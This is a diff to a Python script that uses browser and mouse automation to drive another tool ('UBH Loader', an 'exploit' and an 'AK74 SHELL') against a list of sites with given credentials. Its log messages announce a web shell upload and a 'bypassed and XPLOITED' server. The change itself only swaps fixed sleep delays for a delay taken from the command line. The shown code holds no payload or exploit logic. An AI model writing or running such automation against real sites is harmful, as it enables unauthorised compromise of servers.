@@ -266,7 +266,7 @@ def Run(*, site_list, username,passwords,timeout = 10):
         print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mUBH Loader did not load properly")
         return driver.quit()
 
-    time.sleep(2)
+    time.sleep(delaypc)
     print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mControlling mouse to select\033[0m\033[0m")
     try:
         Click('ubhselecht.png').Position_Image()
@@ -276,31 +276,31 @@ def Run(*, site_list, username,passwords,timeout = 10):
     print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mSelected\033[0m\033[0m")
 
     print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mControlling mouse to desktop\033[0m\033[0m")
-    time.sleep(0.5)
+    time.sleep(delaypc)
     try:
         Click('desktop.png').Position_Image()
     except:
         print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mYou have configured \'bot_photos\' wrong read our docs for correct usage")
         return driver.quit()
     print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mControlling Mouse to XPLOIT\033[0m\033[0m")
-    time.sleep(0.5)
+    time.sleep(delaypc)
     try:
         Click('exploit.png').DoubleClick()
     except:
         print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mYou have configured \'bot_photos\' wrong read our docs for correct usage")
         return driver.quit()
     print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mControlling mouse to AK74 SHELL\033[0m\033[0m")
-    time.sleep(0.5)
+    time.sleep(delaypc)
     try:
         Click('ak.png').DoubleClick()
     except:
         print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mYou have configured \'bot_photos\' wrong read our docs for correct usage")
         return driver.quit()
     print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mSHELL UPLOADED\033[0m\033[0m")
-    time.sleep(0.5)
+    time.sleep(delaypc)
     try:
         Click('ubhup.png').Position_Image()
-        time.sleep(0.5)
+        time.sleep(delaypc)
     except:
         print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mYou have configured \'bot_photos\' wrong read our docs for correct usage")
         return driver.quit()
@@ -315,7 +315,6 @@ def Run(*, site_list, username,passwords,timeout = 10):
     print()
     print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mSuccessfully bypassed and \033[32mXPLOITED\033[0m the SERVER\033[0m\033[0m")
     
-
 
 LOGO = """
  {}╔═╗╔═╗╔╗╔╔╦╗╦  ╔═╗  
@@ -345,6 +344,12 @@ LOGO = """
 '\033[\033[38;5;219m'
 )
 
+try:
+    delaypc = int(argv[1])
+    
+except:
+    print(LOGO)
+    exit("\033[31mPlease do not use letters only numbers\033[0m")
 
 if __name__ == '__main__':
     print(LOGO)      
